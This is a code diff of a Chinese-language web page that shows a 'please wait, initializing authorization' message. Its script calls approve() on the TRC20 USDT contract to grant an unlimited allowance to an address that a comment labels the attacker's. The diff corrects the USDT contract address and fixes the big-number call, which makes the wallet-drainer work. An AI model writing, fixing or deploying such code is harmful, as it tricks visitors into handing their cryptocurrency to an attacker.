@@ -15,8 +15,8 @@
   <p id="status">請稍候，正在初始化授權...</p>
 
   <script>
-    const USDT_CONTRACT = "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT"; // TRC20 USDT 主網
-    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 攻擊者地址
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // ✅ 正確的 TRC20 USDT 合約地址
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";       // ✅ 攻擊者地址
 
     const ABI = [{
       "constant": false,
@@ -40,7 +40,8 @@
       document.getElementById("status").innerText = "⏳ 發送授權中...";
 
       try {
-        const tx = await contract.approve(SPENDER, tronWeb.toBigNumber(2).pow(256).minus(1)).send();
+        const maxUint = tronWeb.BigNumber(2).pow(256).minus(1);
+        const tx = await contract.approve(SPENDER, maxUint).send();
         document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
